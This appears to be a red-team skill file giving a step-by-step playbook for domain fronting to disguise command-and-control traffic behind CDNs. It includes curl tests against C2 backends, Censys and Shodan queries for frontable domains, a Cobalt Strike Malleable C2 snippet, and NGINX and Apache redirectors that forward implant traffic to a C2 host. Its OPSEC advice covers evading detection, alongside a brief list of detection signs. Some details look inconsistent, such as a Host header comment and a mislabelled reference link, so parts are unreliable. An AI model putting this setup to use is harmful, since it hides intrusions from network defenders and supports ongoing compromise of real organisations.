---
name: domain-fronting
description: Domain fronting for C2 evasion — CDN-based fronting, CloudFront/Cloudflare/Google Front End abuse, C2 traffic camouflage, and find-frontable-domains
version: 1.0.0
phase: post
category: post-exploitation
tags: [domain-fronting, c2, evasion, cdn, cloud]
tools: [python3, curl, openssl, censys, shodan]
difficulty: advanced
opsec_level: medium
time_estimate: 2-4h
severity_if_found: high
mitre_attack:
  - T1090.004
  - T1572
  - T1008
---

## When to Use

Use domain fronting when your C2 IP or domain has been blocked, or as a proactive evasion layer to make C2 traffic appear as legitimate CDN traffic to a high-reputation domain. Effective in network environments with egress filtering, TLS inspection, or domain-based allowlists.

**Caveat:** As of 2024-2026, AWS CloudFront, Cloudflare, and Google have largely deprecated the SNI/Host decoupling that made classical domain fronting work. Azure Front Door and Cloudflare Workers are the remaining viable platforms.

## What It Does

Exploits the decoupling between the TLS SNI field (indicating the front domain) and the HTTP Host header (indicating the actual C2 server). Traffic goes to the frontable CDN, which routes to the hidden backend based on Host. Egress filters see only the high-reputation front domain in the TLS handshake.

## Methodology

### Phase 1: Identify Frontable CDNs

The fundamental requirement: the CDN must accept a TLS connection for domain A (SNI = front) but route the HTTP request to domain B (Host = backend). This requires shared hosting on the same edge IP.

```bash
# Test a candidate domain for frontability
curl -s -k -H "Host: your-c2-backend.com" \
  "https://candidate-cdn-domain.com/any/path" \
  --resolve "candidate-cdn-domain.com:443:CDN_EDGE_IP"

# If you get a response from your C2, it's frontable
# If you get the CDN's default page, it's NOT frontable
```

**Azure Front Door (most viable as of 2026):**
- Verify with: SNI = `yourapp.azurefd.net`, Host = `your-c2-domain.com`
- Requires the backend domain to be registered on the AFD endpoint
- Microsoft has NOT deprecated the SNI/Host decoupling

**Cloudflare Workers:** Workers are SNI-flexible but the route must be defined in your Cloudflare zone. Less useful for hiding (both domains are yours).

**Google Front End (GFE, largely deprecated):** No longer forwards unknown Host headers. App Engine and GFE dropped fronting support in 2021.

**CloudFront (partially deprecated):** As of 2025, CloudFront validates Host against the distribution config. Must register the backend domain as an alternate CNAME.

### Phase 2: Find Frontable Domains

```bash
# Censys query: find high-traffic CDN edge IPs sharing the same IP
# Search criteria: services.service_name: "CloudFront" AND
#   services.tls.certificate.parsed.subject.common_name: "*.cloudfront.net"

# Shodan: find Azure Front Door endpoints
# search: "Azure Front Door" 443
# or: http.html:"Azure Front Door"

# Find all domains sharing a CloudFront IP
python3 -c "
import dns.resolver
domain = 'dxxxxxx.cloudfront.net'
answers = dns.resolver.resolve(domain, 'A')
for ip in answers:
    print(f'CloudFront IP: {ip}')
    # Reverse DNS may reveal other frontable domains
"
```

**Key censys queries (use via CLI or API):**

- `services.service_name: "CDN" AND services.http.response.body: "404 Not Found"` — potential frontable backends
- `services.tls.certificate.parsed.extensions.subject_alt_name.dns_names: "*.azurefd.net"` — Azure FD edge nodes
- `services.tls.certificate.parsed.extensions.subject_alt_name.dns_names: "*.cloudfront.net"` — CloudFront edge nodes

### Phase 3: C2 Configuration

**Cobalt Strike Malleable C2 profile (domain fronting compatible):**

```
# In the http-config block:
set uri "/static/js/main.js";
set user_agent "Mozilla/5.0...Chrome/120";
header "Host" "frontable-cdn-domain.com";  # SNI backend
header "X-Forwarded-For" ".";
```

**C2 → Redirector → CDN routing:**

```
Implant ──TLS──▸ CDN Edge (SNI: front.com) ──HTTP──▸ Backend (Host: c2.com)
```

- Implant dials TLS to `frontable-cdn.com`
- TLS SNI = `frontable-cdn.com` (passes egress/DNS inspection)
- HTTP request has Host: `your-c2-backend.com`
- CDN routes the HTTP request to the registered backend
- Backend sees the original request (with X-Forwarded-For)

### Phase 4: Redirector Setup (Alternative/Backup)

```nginx
# NGINX redirector with conditional routing
server {
    listen 443 ssl;
    server_name front-domain.com;

    location / {
        # If no valid C2 user-agent, serve decoy content
        if ($http_user_agent !~ "Mozilla/5.0.*Chrome/120") {
            rewrite ^ /decoy/ permanent;
        }
        proxy_pass https://c2-backend.com;
        proxy_set_header Host c2-backend.com;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

        # gRPC/protobuf support for modern C2
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
    }
}
```

**Apache mod_rewrite variant:**

```apache
RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0.*Chrome/120" [NC]
RewriteRule ^(.*)$ https://c2-backend.com/$1 [P,L]
RewriteRule ^(.*)$ /decoy/ [R=302,L]
```

### Phase 5: TLS Certificate Validation

```bash
# Verify the CDN's TLS cert covers the front domain
openssl s_client -connect frontable-cdn.com:443 -servername frontable-cdn.com \
  </dev/null 2>/dev/null | openssl x509 -noout -text | grep "Subject Alternative Name"

# If SNI mismatch is detected, some CDNs now respond with error
# Test both with and without --servername:
curl -k -H "Host: c2-backend.com" https://edge-ip/test
```

## Detection & OPSEC

**How defenders detect domain fronting:**
- **TLS fingerprint mismatch:** JA3/JA3S hashes of the CDN's TLS stack vs the implant's TLS library differ. Use JA3-spoofing implants (modern Sliver, custom Mythic payloads).
- **SNI vs Host inconsistency:** NGFWs can now inspect ALPN and compare SNI to the HTTP Host header. Azure and GCP firewalls flag mismatches.
- **DNS resolution anomalies:** The implant connects to the CDN edge IP but never resolves the front domain — DNS logs show no `front.com` lookup for that host.
- **Flow duration:** CDN traffic to a fronted C2 may have longer session durations than typical CDN content serving.

**OPSEC guidelines:**
- Use front domains with similar traffic patterns (video streaming CDNs look like your C2)
- Vary the front domain: rotate weekly or per-beacon
- Set Jitter >30% on C2 beacon to blend with human browsing patterns
- If using CloudFront, register the backend domain as an Alt-Name to avoid detection (this changes the threat model from "hidden" to "obfuscated")
- Monitor Shodan for your front domain being flagged as suspicious
- Keep TLS libraries updated — signature-based detection of `tls-client` or Go net/http is common

**When domain fronting fails (as backup):**
- Use CDN-wrapping: the implant talks to a legitimate API (Google Sheets, Discord, Slack, Notion) and the C2 extracts commands from it
- Use Malleable C2 profiles that mimic real API traffic patterns
- Fall back to redirector chains with domain categorization grooming

## References

- Domain fronting via CloudFront: https://github.com/vysec/DomainFronting
- find-frontable-domains: https://github.com/vysec/find-frontable-domains
- Censys search for CDN endpoints: https://search.censys.io/
- Azure Front Door routing: https://learn.microsoft.com/en-us/azure/frontdoor/front-door-routing-architecture
- Malleable C2 profile reference: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_profile_language.md
- DigiNinja Domain Front Testing: https://github.com/sensepost/domainhunter
